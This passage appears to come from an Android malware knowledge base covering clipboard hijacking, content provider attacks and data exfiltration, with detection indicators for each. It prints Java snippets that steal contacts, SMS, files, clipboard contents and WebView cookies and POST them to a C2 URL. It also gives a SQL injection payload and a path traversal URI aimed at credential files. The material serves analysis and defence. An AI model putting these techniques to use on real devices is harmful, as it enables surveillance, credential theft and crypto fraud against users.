managers)</li> <li>Email addresses</li> <li>Phone numbers</li> <li>Banking card numbers (matching Luhn algorithm patterns)</li> <li>API keys and tokens</li> </ul> <p>Anything copied is logged and exfiltrated to C2. Users routinely copy credentials from password managers, notes apps, and messages, creating a steady stream of sensitive data through the clipboard.</p>"},{"location":"attacks/clipboard-hijacking/#otp-theft","title":"OTP Theft","text":"<p>When a user receives a one-time password via SMS or authenticator app and copies it, the clipboard briefly contains the OTP. Malware with a clipboard listener captures this immediately. Combined with other stolen credentials, this enables account takeover. Some banking apps auto-fill OTPs from SMS, but users who manually copy-paste from their SMS app or authenticator expose the code through clipboard.</p>"},{"location":"attacks/clipboard-hijacking/#android-mitigations","title":"Android Mitigations","text":"Version Change Impact on Attack Android 10 (API 29) Background apps cannot read clipboard Malware must maintain foreground state or use accessibility service. Accessibility bypass remains fully effective. Android 12 (API 31) Toast notification when an app reads clipboard User sees \"[App] pasted from your clipboard\" toast. Accessibility services bypass this notification. Apps that set clipboard data themselves don't trigger it. Android 12 (API 31) <code>ClipDescription.getConfidential()</code> flag Keyboard and IME apps can mark clipboard content as sensitive, preventing it from appearing in content suggestions. Does not prevent programmatic reads. Android 13 (API 33) Clipboard auto-cleared after approximately 1 hour Limits the time window for passive clipboard monitoring. Active listeners still capture content in real-time before the auto-clear. Crypto clippers are unaffected since they operate at the moment of copy. Android 14 (API 34) Background activity launch restrictions tightened Harder for background apps to bring themselves to foreground for clipboard access. Accessibility services unaffected. <p>The clipboard access toast in Android 12 is the most visible mitigation, but it only appears for reads, not for the initial copy event. A crypto clipper that replaces clipboard content on the <code>OnPrimaryClipChangedListener</code> callback operates before the user pastes, so the toast for the malware's clipboard write may flash briefly but is easily missed or attributed to the legitimate app.</p> <p>Accessibility services remain the consistent bypass across all Android versions. Every restriction introduced since Android 10 has an exception for accessibility, making it the reliable path for clipboard-based attacks.</p>"},{"location":"attacks/clipboard-hijacking/#families-using-this-technique","title":"Families Using This Technique","text":"Family Clipboard Capability Primary Target Cerberus Clipboard monitoring via accessibility keylogger Credentials, banking data Hook Clipboard read/write, inherits Cerberus-lineage clipboard access Credentials, banking data FireScam Continuous clipboard capture, exfiltrates copied passwords and tokens Credentials, OTPs SparkCat OCR-based crypto theft from screenshots (complements clipboard attack) Crypto seed phrases SpyAgent OCR-based crypto theft from screenshots (complements clipboard attack) Crypto seed phrases Triada System-level clipboard replacement, swaps wallet addresses during copy-paste Cryptocurrency addresses Gigabud Replaces bank card numbers in clipboard with attacker-controlled numbers Banking card numbers BTMOB RAT Continuous clipboard monitoring for wallet addresses, passwords, and OTPs Crypto, credentials, OTPs SpyNote Clipboard monitoring and capture as part of full surveillance suite General data exfiltration Hermit Clipboard monitoring module in state-sponsored spyware toolkit Intelligence collection Gustuff Clipboard injection to fill banking transfer fields on older Android versions Banking ATS <p>Triada operates at the system level through Zygote injection or firmware-level implantation, giving it clipboard access across every process on the device without any permission requirements. Gigabud specifically targets banking card numbers rather than cryptocurrency, replacing copied card numbers with attacker-controlled numbers to redirect card-based payments.</p> <p>SparkCat and SpyAgent represent an adjacent technique: rather than intercepting clipboard contents at copy time, they use OCR to scan gallery images for screenshots of crypto seed phrases. The two approaches are complementary, and a sophisticated operation could deploy both.</p>"},{"location":"attacks/clipboard-hijacking/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>ClipboardManager</code> usage with <code>addPrimaryClipChangedListener</code></li> <li><code>setPrimaryClip</code> or <code>setPrimaryClipData</code> calls (indicates clipboard writing/replacement)</li> <li>Regex patterns matching cryptocurrency address formats (BTC, ETH, TRON, etc.)</li> <li><code>ContentObserver</code> registered against clipboard URI</li> <li>Accessibility service with <code>flagRetrieveInteractiveWindows</code> or <code>flagRequestAccessibilityButton</code></li> </ul> Dynamic Indicators <ul> <li>Clipboard content changes immediately after user copies a cryptocurrency address</li> <li>App maintains a foreground service with minimal visible UI</li> <li>Network exfiltration of clipboard contents to C2 after copy events</li> <li>Multiple attacker wallet addresses hardcoded or fetched from C2 configuration</li> </ul>"},{"location":"attacks/content-provider-attacks/","title":"Content Provider Attacks","text":"<p>Exploiting exposed or misconfigured <code>ContentProvider</code> components to read, modify, or delete app data. Content providers are Android's standard mechanism for sharing structured data between apps. When exported without proper permission checks, they expose databases, files, and internal state.</p> <p>Requirements</p> Requirement Details Permission None (if provider is exported without permission protection) Condition Target app exports a ContentProvider with insufficient access controls"},{"location":"attacks/content-provider-attacks/#how-content-providers-work","title":"How Content Providers Work","text":"<p>A content provider exposes data through a URI-based interface:</p> <pre><code>content://com.target.app.provider/users\ncontent://com.target.app.provider/users/42\n</code></pre> <p>Other apps query this using <code>ContentResolver</code>:</p> <pre><code>Cursor cursor = getContentResolver().query(\n    Uri.parse(\"content://com.target.app.provider/users\"),\n    null, null, null, null\n);\n</code></pre> <p>Providers can also serve files via <code>openFile()</code>.</p>"},{"location":"attacks/content-provider-attacks/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/content-provider-attacks/#sql-injection","title":"SQL Injection","text":"<p>If the provider builds SQL queries from user-supplied input without parameterization:</p> <pre><code>// Vulnerable\nString selection = \"name = '\" + userInput + \"'\";\ncursor = db.query(\"users\", null, selection, null, null, null, null);\n</code></pre> <p>Attack:</p> <pre><code>Uri uri = Uri.parse(\"content://com.target.app.provider/users\");\nCursor c = getContentResolver().query(uri, null,\n    \"1=1) UNION SELECT password,2,3 FROM credentials--\", null, null);\n</code></pre>"},{"location":"attacks/content-provider-attacks/#path-traversal","title":"Path Traversal","text":"<p>Providers that serve files via <code>openFile()</code> may be vulnerable to path traversal:</p> <pre><code>// Vulnerable\npublic ParcelFileDescriptor openFile(Uri uri, String mode) {\n    File file = new File(getContext().getFilesDir(), uri.getLastPathSegment());\n    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);\n}\n</code></pre> <p>Attack:</p> <pre><code>content://com.target.app.fileprovider/../../shared_prefs/credentials.xml\n</code></pre> <p>If <code>../</code> sequences are not stripped, the attacker reads arbitrary files within the app's storage.</p>"},{"location":"attacks/content-provider-attacks/#exported-provider-data-leakage","title":"Exported Provider Data Leakage","text":"<p>Providers exported without permission restrictions expose all their data:</p> <pre><code>&lt;provider\n    android:name=\".UserProvider\"\n    android:authorities=\"com.target.app.provider\"\n    android:exported=\"true\" /&gt;\n</code></pre> <p>Any app on the device can query all data. Oversecured's research on app protected components found that more than 80% of apps contain content provider or intent redirection vulnerabilities.</p>"},{"location":"attacks/content-provider-attacks/#permission-confusion","title":"Permission Confusion","text":"<p>Even \"protected\" providers can be exploitable:</p> <ul> <li><code>android:readPermission</code> and <code>android:writePermission</code> set globally but overridden per-path with weaker permissions</li> <li><code>android:grantUriPermissions=\"true\"</code> allows temporary URI grants that bypass protection</li> <li><code>path-permission</code> elements that don't cover all paths</li> </ul>"},{"location":"attacks/content-provider-attacks/#uri-grant-exploitation","title":"URI Grant Exploitation","text":"<p>Apps grant temporary access to content URIs:</p> <pre><code>Intent intent = new Intent();\nintent.setData(contentUri);\nintent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n</code></pre> <p>If the receiving app doesn't properly scope the grant, or if <code>grantUriPermissions</code> is enabled with broad <code>pathPattern</code>, an attacker may access more data than intended. Oversecured's content provider research details how intent redirection followed by URI grant exploitation provides access to arbitrary content providers. The common chain: force intent redirection to a vulnerable activity, then use <code>FLAG_GRANT_READ_URI_PERMISSION</code> with a broad <code>grantUriPermissions=\"true\"</code> declaration to access any content URI within the target app.</p>"},{"location":"attacks/content-provider-attacks/#fileprovider-misconfiguration","title":"<code>FileProvider</code> Misconfiguration","text":"<p><code>FileProvider</code> (from AndroidX) is meant to safely share files. Misconfigurations:</p> <pre><code>&lt;paths&gt;\n    &lt;root-path name=\"root\" path=\"/\" /&gt;\n&lt;/paths&gt;\n</code></pre> <p>This exposes the entire filesystem. The default template from StackOverflow answers often includes overly broad paths. Oversecured's content provider weakness catalog documents the complete chain from intent redirection to FileProvider path traversal exploitation.</p>"},{"location":"attacks/content-provider-attacks/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 10 (API 29) <code>android:exported</code> defaults to <code>false</code> for providers without intent filters Only protects providers without intent filters; many still explicitly set <code>exported=\"true\"</code> Android 12 (API 31) Apps must explicitly declare <code>android:exported</code> on all components Developers often set <code>exported=\"true\"</code> to resolve build errors without considering security implications"},{"location":"attacks/content-provider-attacks/#families-using-this-technique","title":"Families Using This Technique","text":"Family Usage Details Goldoson Data harvesting SDK SDK queried content providers for device info, installed app list, and location data Triada System-level abuse Pre-installed in firmware, accessed content providers with system-level permissions SpyNote Data exfiltration Queries SMS, contacts, and call log content providers after obtaining permissions <p>Content provider attacks are more commonly exploited in app-to-app vulnerability research than in malware. Oversecured's research has documented these vulnerabilities across Google, Samsung, TikTok, and banking applications.</p>"},{"location":"attacks/content-provider-attacks/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Providers with <code>android:exported=\"true\"</code> and no <code>android:readPermission</code>/<code>android:writePermission</code></li> <li><code>openFile()</code> implementations without path validation</li> <li>Raw SQL concatenation in <code>query()</code>, <code>update()</code>, <code>delete()</code> methods</li> <li><code>grantUriPermissions=\"true\"</code> with broad <code>path-pattern</code></li> <li><code>FileProvider</code> paths including <code>root-path</code> or broad <code>external-path</code></li> <li><code>res/xml/file_paths.xml</code> or <code>provider_paths.xml</code> for FileProvider configuration</li> </ul> Dynamic Indicators <ul> <li>Drozer enumeration of exported content providers</li> <li>Unexpected data returned from provider queries by third-party apps</li> <li>Path traversal attempts via <code>openFile()</code> returning files outside intended directory</li> <li>URI grant escalation via <code>FLAG_GRANT_READ_URI_PERMISSION</code></li> </ul>"},{"location":"attacks/content-provider-attacks/#vendor-specific-content-provider-vulnerabilities","title":"Vendor-Specific Content Provider Vulnerabilities","text":"<p>OEM customizations introduce content provider attack surface beyond AOSP. Oversecured's Samsung research found SMS/MMS database access via path traversal using <code>Uri.getLastPathSegment()</code>, and a content provider in <code>com.sec.imsservice</code> exposing arbitrary files. Oversecured's Xiaomi research documented 20 security issues including multiple content provider access vulnerabilities in Xiaomi system apps. Oversecured's methodology guide for vendor-specific vulnerabilities covers how to systematically analyze OEM modifications for content provider exposure beyond stock Android.</p>"},{"location":"attacks/content-provider-attacks/#chained-attacks","title":"Chained Attacks","text":"<p>Content provider vulnerabilities are frequently the second stage in multi-step attack chains:</p> <ol> <li> <p>Intent redirection to content provider access: Force an app to launch an internal activity via intent redirection, then exploit that activity's access to content providers. Oversecured's dynamic code loading research demonstrated this chain: intent redirection gave access to a vulnerable content provider, which allowed writing an arbitrary Google Play Core library module, resulting in persistent local code execution.</p> </li> <li> <p>Content provider to WebView exploitation: Access file-based content providers to inject content into WebViews. Oversecured's TikTok research found 4 high-severity vulnerabilities including 3 persistent arbitrary code execution paths through this type of chain.</p> </li> </ol>"},{"location":"attacks/data-exfiltration/","title":"Data Exfiltration","text":"<p>Stealing data from compromised Android devices and transmitting it to attacker-controlled infrastructure. Data exfiltration is the operational objective behind most Android malware -- permissions, persistence, and evasion exist to support it. The scope ranges from targeted credential theft (banking trojans) to bulk surveillance (state-sponsored spyware) to opportunistic harvesting (adware SDKs collecting more than they should).</p> <p>See also: C2 Communication, SMS Interception, Keylogging, Screen Capture</p> <p>Requirements</p> Requirement Details Permissions Varies by data type: <code>READ_CONTACTS</code>, <code>READ_SMS</code>, <code>READ_EXTERNAL_STORAGE</code>, <code>READ_CALL_LOG</code>, <code>READ_PHONE_STATE</code>, <code>INTERNET</code> Exfiltration channel HTTP/HTTPS C2, Telegram Bot API, cloud storage, SMS fallback Optional <code>MANAGE_EXTERNAL_STORAGE</code> for full filesystem access, root for cross-app data theft"},{"location":"attacks/data-exfiltration/#contact-list-theft","title":"Contact List Theft","text":"<p>The device contact list provides a social graph. Malware queries <code>ContactsContract</code> via <code>ContentResolver</code> to dump names, phone numbers, email addresses, and associated account metadata.</p> <pre><code>Cursor cursor = getContentResolver().query(\n    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,\n    new String[]{\n        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,\n        ContactsContract.CommonDataKinds.Phone.NUMBER\n    },\n    null, null, null\n);\n\nJSONArray contacts = new JSONArray();\nwhile (cursor.moveToNext()) {\n    JSONObject c = new JSONObject();\n    c.put(\"name\", cursor.getString(0));\n    c.put(\"phone\", cursor.getString(1));\n    contacts.put(c);\n}\ncursor.close();\nexfiltrate(contacts);\n</code></pre> <p>Requires <code>READ_CONTACTS</code> (runtime permission, dangerous protection level). Most malware requests this at install time alongside other permissions, buried in a batch grant flow.</p>"},{"location":"attacks/data-exfiltration/#operational-uses","title":"Operational Uses","text":"Purpose How Contacts Are Used Example Worm propagation Send smishing SMS to every contact FluBot sent phishing links to all contacts, creating chain-reaction infections across Europe Social graph mapping Build relationship maps for intelligence State-sponsored tools like Pegasus and Hermit exfiltrate contacts for network analysis Targeted phishing Spear-phish contacts using the victim's name as social proof \"Hey [contact name], [victim name] shared this with you\" Loan app harassment Contact the victim's family and colleagues to pressure repayment SpyLoan apps call and message contacts with threatening or embarrassing content <p>Bulk exfiltration dumps the entire contact list in one request. Incremental exfiltration tracks a <code>ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP</code> cursor to send only new or modified entries, reducing network footprint.</p>"},{"location":"attacks/data-exfiltration/#sms-call-log-harvesting","title":"SMS &amp; Call Log Harvesting","text":""},{"location":"attacks/data-exfiltration/#sms-database","title":"SMS Database","text":"<p>Reading the SMS content provider retroactively gives access to the entire message history, not just new messages. This differs from real-time SMS interception which catches messages as they arrive.</p> <pre><code>Cursor cursor = getContentResolver().query(\n    Uri.parse(\"content://sms\"),\n    new String[]{\"address\", \"body\", \"date\", \"type\"},\n    null, null, \"date DESC\"\n);\nwhile (cursor.moveToNext()) {\n    String sender = cursor.getString(0);\n    String body = cursor.getString(1);\n    long timestamp = cursor.getLong(2);\n    int type = cursor.getInt(3);\n    collect(sender, body, timestamp, type);\n}\ncursor.close();\n</code></pre> <p>The <code>type</code> field distinguishes inbox (1), sent (2), draft (3), and outbox (4). Banking trojans filter for messages containing numeric patterns matching OTP formats (4-8 digit codes) or messages from banking shortcodes. Surveillance tools exfiltrate everything.</p>"},{"location":"attacks/data-exfiltration/#call-log","title":"Call Log","text":"<pre><code>Cursor cursor = getContentResolver().query(\n    CallLog.Calls.CONTENT_URI,\n    new String[]{\n        CallLog.Calls.NUMBER,\n        CallLog.Calls.TYPE,\n        CallLog.Calls.DATE,\n        CallLog.Calls.DURATION\n    },\n    null, null, CallLog.Calls.DATE + \" DESC\"\n);\n</code></pre> <p>Requires <code>READ_CALL_LOG</code>. Call logs reveal communication patterns, frequency of contact with specific numbers, and call durations -- valuable for surveillance and social engineering.</p>"},{"location":"attacks/data-exfiltration/#targeted-extraction","title":"Targeted Extraction","text":"<p>Rather than bulk-dumping everything, some families target specific message types:</p> Target Filter Pattern Purpose Banking OTPs Sender matches bank shortcodes, body contains 4-8 digit codes Retroactive 2FA bypass Transaction confirmations Body contains currency symbols, \"transfer\", \"payment\" Financial monitoring Authentication codes Body contains \"code\", \"verify\", \"OTP\" Account takeover Two-way banking conversations Messages to/from known bank numbers Full transaction history reconstruction"},{"location":"attacks/data-exfiltration/#file-exfiltration","title":"File Exfiltration","text":""},{"location":"attacks/data-exfiltration/#external-storage-scanning","title":"External Storage Scanning","text":"<p>Before Android 10, any app with <code>READ_EXTERNAL_STORAGE</code> could recursively scan <code>/sdcard/</code> and read any file. Malware walks the directory tree looking for files matching target extensions or paths.</p> <pre><code>private void scanDirectory(File dir) {\n    File[] files = dir.listFiles();\n    if (files == null) return;\n    for (File file : files) {\n        if (file.isDirectory()) {\n            scanDirectory(file);\n        } else if (isTargetFile(file.getName())) {\n            exfiltrateFile(file);\n        }\n    }\n}\n\nprivate boolean isTargetFile(String name) {\n    String lower = name.toLowerCase();\n    return lower.endsWith(\".pdf\") || lower.endsWith(\".doc\") || lower.endsWith(\".docx\")\n        || lower.endsWith(\".xls\") || lower.endsWith(\".xlsx\")\n        || lower.endsWith(\".jpg\") || lower.endsWith(\".png\")\n        || lower.endsWith(\".db\") || lower.endsWith(\".sqlite\")\n        || lower.endsWith(\".key\") || lower.endsWith(\".wallet\");\n}\n</code></pre>"},{"location":"attacks/data-exfiltration/#scoped-storage-impact","title":"Scoped Storage Impact","text":"<p>Android 10 introduced scoped storage, restricting apps to their own sandbox directory and shared media collections. Direct file path access to other apps' files no longer works without <code>MANAGE_EXTERNAL_STORAGE</code>.</p> Android Version Storage Access Impact on Malware Pre-10 Full <code>/sdcard/</code> access with <code>READ_EXTERNAL_STORAGE</code> Unrestricted file theft 10 (API 29) Scoped storage introduced, <code>requestLegacyExternalStorage=true</code> opt-out available Malware targets API 28 to avoid restriction 11 (API 30) Legacy opt-out removed, <code>MANAGE_EXTERNAL_STORAGE</code> required for full access Must request special permission via Settings intent 13 (API 33) Granular media permissions (<code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code>, <code>READ_MEDIA_AUDIO</code>) replace <code>READ_EXTERNAL_STORAGE</code> Malware requests all three media permissions 14 (API 34) Selected media access (user can grant partial photo library) Limits bulk media theft if user picks selectively <p>Malware targeting API levels below 30 still gets legacy storage access. Many families deliberately set <code>targetSdkVersion</code> lower to avoid newer restrictions, accepting the trade-off of a Play Store compatibility warning (irrelevant for sideloaded malware).</p>"},{"location":"attacks/data-exfiltration/#mediastore-api","title":"MediaStore API","text":"<p>For malware respecting scoped storage (or forced to by targeting newer APIs), the <code>MediaStore</code> API provides access to shared media collections:</p> <pre><code>String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,\n    MediaStore.Images.Media.DATA};\nCursor cursor = getContentResolver().query(\n    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,\n    projection, null, null, MediaStore.Images.Media.DATE_ADDED + \" DESC\"\n);\nwhile (cursor.moveToNext()) {\n    Uri imageUri = ContentUris.withAppendedId(\n        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cursor.getLong(0));\n    String name = cursor.getString(1);\n    exfiltrateMedia(imageUri, name);\n}\ncursor.close();\n</code></pre>"},{"location":"attacks/data-exfiltration/#high-value-file-targets","title":"High-Value File Targets","text":"Target Path / Identifier Value WhatsApp database <code>/sdcard/WhatsApp/Databases/msgstore.db.crypt14</code> Full chat history (encrypted, but key extractable with root or backup exploit) WhatsApp media <code>/sdcard/WhatsApp/Media/</code> Photos, videos, voice notes, documents shared in chats Telegram cache <code>/sdcard/Android/data/org.telegram.messenger/cache/</code> Cached messages and media (scoped storage blocks this post-Android 11) Crypto wallet files <code>.wallet</code>, <code>.dat</code>, <code>keystore</code> files Private keys, seed phrases, wallet backups Authentication tokens App-specific token files in external storage Session hijacking PDF/Office documents <code>.pdf</code>, <code>.doc</code>, <code>.xlsx</code> across <code>/sdcard/Documents/</code>, <code>/sdcard/Download/</code> Corporate espionage, personal data Photos for blackmail Recent camera photos via <code>DCIM/Camera/</code> SpyLoan steals photos to threaten victims into paying extortionate loan fees Browser downloads <code>/sdcard/Download/</code> Documents, credentials, downloaded files <p>SpyLoan Pattern</p> <p>SpyLoan apps specifically target the photo gallery, contact list, and SMS history. Stolen photos (especially private or compromising images) are used as leverage to extort victims who default on predatory loans. This pattern has been documented across hundreds of Play Store apps targeting users in Southeast Asia, Latin America, and Africa.</p>"},{"location":"attacks/data-exfiltration/#clipboard-monitoring-theft","title":"Clipboard Monitoring &amp; Theft","text":""},{"location":"attacks/data-exfiltration/#clipboardmanager-listener","title":"ClipboardManager Listener","text":"<p>Apps register <code>OnPrimaryClipChangedListener</code> to receive callbacks every time the user copies text. Before Android 10, any background app could read clipboard contents continuously.</p> <pre><code>ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);\nclipboard.addPrimaryClipChangedListener(() -&gt; {\n    ClipData clip = clipboard.getPrimaryClip();\n    if (clip != null &amp;&amp; clip.getItemCount() &gt; 0) {\n        String text = clip.getItemAt(0).getText().toString();\n        if (isCryptoAddress(text)) {\n            replaceCryptoAddress(clipboard, text);\n        }\n        exfiltrate(\"clipboard\", text);\n    }\n});\n</code></pre>"},{"location":"attacks/data-exfiltration/#crypto-address-replacement-clipboard-hijacking","title":"Crypto Address Replacement (Clipboard Hijacking)","text":"<p>The malware monitors for cryptocurrency wallet addresses in the clipboard. When detected, it silently replaces the copied address with an attacker-controlled address. The victim pastes what they believe is the intended recipient address but sends funds to the attacker. See Clipboard Hijacking for full coverage.</p>"},{"location":"attacks/data-exfiltration/#android-restrictions","title":"Android Restrictions","text":"Version Change Impact Android 10 (API 29) Only the foreground app or default IME can read clipboard Background clipboard monitoring broken Android 12 (API 31) Toast notification shown when an app reads clipboard User sees \"[App] pasted from your clipboard\" Android 13 (API 33) Clipboard auto-clears after a configurable timeout Reduces window for clipboard theft <p>Post-Android 10, malware uses accessibility services to read clipboard indirectly by intercepting paste events in text fields, or operates as an IME to maintain foreground clipboard access.</p>"},{"location":"attacks/data-exfiltration/#browser-data-theft","title":"Browser Data Theft","text":""},{"location":"attacks/data-exfiltration/#chrome-and-webview-data","title":"Chrome and WebView Data","text":"<p>On rooted devices or via backup exploits, malware accesses browser databases stored in app-private directories:</p> Data Location Contents Cookies <code>/data/data/com.android.chrome/app_chrome/Default/Cookies</code> Session tokens, authentication cookies Login Data <code>/data/data/com.android.chrome/app_chrome/Default/Login Data</code> Saved usernames and passwords (encrypted with app-specific key) History <code>/data/data/com.android.chrome/app_chrome/Default/History</code> Browsing history with timestamps Web Data <code>/data/data/com.android.chrome/app_chrome/Default/Web Data</code> Autofill data, saved addresses, payment methods Bookmarks <code>/data/data/com.android.chrome/app_chrome/Default/Bookmarks</code> Bookmarked URLs <p>Without root, malware targeting WebView-based apps can inject JavaScript to extract <code>localStorage</code>, <code>sessionStorage</code>, and cookies from within the WebView context if the app's WebView configuration is insecure (JavaScript enabled, no content security restrictions).</p> <pre><code>webView.evaluateJavascript(\n    \"JSON.stringify({cookies: document.cookie, storage: JSON.stringify(localStorage)})\",\n    value -&gt; exfiltrate(\"webview_data\", value)\n);\n</code></pre>"},{"location":"attacks/data-exfiltration/#cookie-theft-implications","title":"Cookie Theft Implications","text":"<p>Stolen session cookies allow the attacker to hijack active sessions without needing credentials. Banking session tokens, social media auth cookies, and email session identifiers are high-value targets. The cookies work until the server-side session expires or the user explicitly logs out.</p>"},{"location":"attacks/data-exfiltration/#account-credential-harvesting","title":"Account &amp; Credential Harvesting","text":""},{"location":"attacks/data-exfiltration/#account-enumeration","title":"Account Enumeration","text":"<p><code>AccountManager.getAccounts()</code> returns all accounts registered on the device (Google, Samsung, third-party app accounts). Requires <code>GET_ACCOUNTS</code> on Android 7 and below; on Android 8+ the permission is still required but only returns accounts belonging to the same authenticator or accounts the user has explicitly granted visibility to.</p> <pre><code>AccountManager am = AccountManager.get(context);\nAccount[] accounts = am.getAccounts();\nfor (Account account : accounts) {\n    exfiltrate(account.type, account.name);\n}\n</code></pre> <p>This reveals which services the victim uses (Google, Facebook, banking apps, crypto exchanges) and the associated email addresses or usernames. On older Android versions, this worked without any runtime permission grant.</p>"},{"location":"attacks/data-exfiltration/#cross-app-data-theft","title":"Cross-App Data Theft","text":"<p>Requires root access or exploiting backup mechanisms:</p> Method Access Required Data Accessible Root + direct file read Root Any app's <code>/data/data/</code> directory: SharedPreferences, SQLite databases, internal files <code>adb backup</code> exploitation ADB access or <code>android:allowBackup=\"true\"</code> App data from apps that allow backup Content provider exploitation None (if provider is exported and unprotected) Whatever the provider exposes <code>run-as</code> abuse Debug builds or ADB App sandbox for debuggable apps <p>Banking trojans and RATs with root access target:</p> <ul> <li>SharedPreferences files containing auth tokens</li> <li>SQLite databases with cached credentials</li> <li>JWT tokens stored in app internal storage</li> <li>Android Keystore entries (requires root + additional exploitation since Keystore is hardware-backed on modern devices)</li> </ul>"},{"location":"attacks/data-exfiltration/#device-information-collection","title":"Device Information Collection","text":"<p>Every Android malware family collects device fingerprint data during initial C2 registration. This data serves multiple purposes: unique bot identification, anti-analysis detection, and campaign segmentation.</p>"},{"location":"attacks/data-exfiltration/#standard-fingerprint-data","title":"Standard Fingerprint Data","text":"<pre><code>JSONObject info = new JSONObject();\ninfo.put(\"imei\", telephonyManager.getDeviceId());\ninfo.put(\"imsi\", telephonyManager.getSubscriberId());\ninfo.put(\"phone\", telephonyManager.getLine1Number());\ninfo.put(\"android_id\", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID));\ninfo.put(\"model\", Build.MODEL);\ninfo.put(\"manufacturer\", Build.MANUFACTURER);\ninfo.put(\"sdk\", Build.VERSION.SDK_INT);\ninfo.put(\"serial\", Build.SERIAL);\ninfo.put(\"operator\", telephonyManager.getNetworkOperatorName());\ninfo.put(\"country\", telephonyManager.getNetworkCountryIso());\n</code></pre>"},{"location":"attacks/data-exfiltration/#extended-collection","title":"Extended Collection","text":"Category Data Points Permission Required Hardware IDs IMEI, IMSI, MEID, serial number <code>READ_PHONE_STATE</code> Network MAC address, WiFi SSID, BSSID, IP address, carrier info <code>ACCESS_WIFI_STATE</code>, <code>ACCESS_FINE_LOCATION</code> (for WiFi SSID on Android 8+) SIM SIM serial (ICCID), operator, country code, dual-SIM status <code>READ_PHONE_STATE</code> Device Model, manufacturer, board, hardware, bootloader version None (Build properties are public) System Android version, API level, build fingerprint, security patch level None Screen Resolution, density, refresh rate None Storage Total/available internal and external storage None Battery Level, charging status, health None Installed apps Full package list with version codes <code>QUERY_ALL_PACKAGES</code> (Android 11+) Running processes Active app list Restricted on Android 7+ Accounts Google account emails, registered account types <code>GET_ACCOUNTS</code>"},{"location":"attacks/data-exfiltration/#anti-analysis-use","title":"Anti-Analysis Use","text":"<p>Device info helps malware detect analysis environments:</p> <ul> <li>Emulator indicators: <code>Build.HARDWARE</code> containing \"goldfish\" or \"ranchu\", <code>Build.PRODUCT</code> containing \"sdk\" or \"generic\"</li> <li>Low IMEI entropy or default IMEI values (000000000000000)</li> <li>Missing SIM card (<code>TelephonyManager.getSimState() != SIM_STATE_READY</code>)</li> <li>Specific device models associated with analysis (Google Pixel with custom ROMs)</li> <li>Unusually small installed app lists (clean analysis device)</li> </ul> <p>See Anti-Analysis Techniques for comprehensive emulator and sandbox detection.</p>"},{"location":"attacks/data-exfiltration/#exfiltration-channels","title":"Exfiltration Channels","text":""},{"location":"attacks/data-exfiltration/#httphttps-post","title":"HTTP/HTTPS POST","text":"<p>The dominant method. Stolen data is JSON-encoded (sometimes Base64-wrapped or encrypted) and sent as a POST body to the C2 endpoint. See C2 Communication for protocol details.</p> <pre><code>JSONObject payload = new JSONObject();\npayload.put(\"bot_id\", botId);\npayload.put(\"data_type\", \"contacts\");\npayload.put(\"payload\", Base64.encodeToString(contactsJson.getBytes(), Base64.NO_WRAP));\n\nURL url = new URL(c2Url + \"/upload\");\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nconn.getOutputStream().write(payload.toString().getBytes());\n</code></pre>"},{"location":"attacks/data-exfiltration/#cloud-service-abuse","title":"Cloud Service Abuse","text":"<p>Legitimate cloud services used as exfiltration endpoints, making traffic harder to distinguish from normal usage:</p> Service Method Observed In Telegram Bot API <code>sendDocument</code> / <code>sendMessage</code> to attacker's chat Mamont, Anubis, FireScam Firebase Realtime Database Direct writes to attacker-controlled Firebase project FireScam, TrickMo Discord webhooks POST to webhook URL with file attachments Commodity RATs, open-source Android RATs Yandex Disk API File upload via REST API Russian-origin families Google Drive OAuth-based upload using stolen or embedded credentials State-sponsored tools AWS S3 Direct PUT to pre-signed URLs Sophisticated campaigns"},{"location":"attacks/data-exfiltration/#sms-based-exfiltration","title":"SMS-Based Exfiltration","text":"<p>Low-bandwidth fallback when internet connectivity is unavailable. The malware sends stolen data (OTP codes, short text) via SMS to an attacker-controlled number. Limited by SMS message length (160 characters) and per-message cost. Used primarily by Rafel RAT and older banking trojans as a secondary channel.</p>"},{"location":"attacks/data-exfiltration/#compressed-archive-upload","title":"Compressed Archive Upload","text":"<p>For bulk data theft (photos, documents, database files), malware creates ZIP archives and uploads them on a schedule or when connected to WiFi to avoid mobile data charges:</p> <pre><code>ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(archivePath));\nfor (File file : targetFiles) {\n    zos.putNextEntry(new ZipEntry(file.getName()));\n    FileInputStream fis = new FileInputStream(file);\n    byte[] buffer = new byte[4096];\n    int len;\n    while ((len = fis.read(buffer)) &gt; 0) {\n        zos.write(buffer, 0, len);\n    }\n    fis.close();\n    zos.closeEntry();\n}\nzos.close();\nuploadToC2(archivePath);\n</code></pre> <p>Spyware families like Pegasus and FinSpy use chunked uploads with resume capability for large files, transmitting only over WiFi by default to avoid alerting the victim with unexpected data usage.</p>"},{"location":"attacks/data-exfiltration/#families-by-exfiltrated-data-type","title":"Families by Exfiltrated Data Type","text":"Family Contacts SMS Call Log Files Photos Clipboard Browser Device Info Location Pegasus Yes Yes Yes Yes Yes Yes Yes Yes Yes FinSpy Yes Yes Yes Yes Yes Yes Yes Yes Yes Hermit Yes Yes Yes Yes Yes Yes Yes Yes Yes SpyNote Yes Yes Yes Yes Yes Yes No Yes Yes FluBot Yes Yes No No No No No Yes No SpyLoan Yes Yes Yes No Yes No No Yes Yes Cerberus Yes Yes No No No No No Yes Yes Anubis Yes Yes No Yes No No No Yes Yes LightSpy Yes Yes Yes Yes Yes Yes Yes Yes Yes Predator Yes Yes Yes Yes Yes Yes Yes Yes Yes GodFather No Yes No No No No No Yes No MoqHao Yes Yes No No No No No Yes No Mamont No Yes 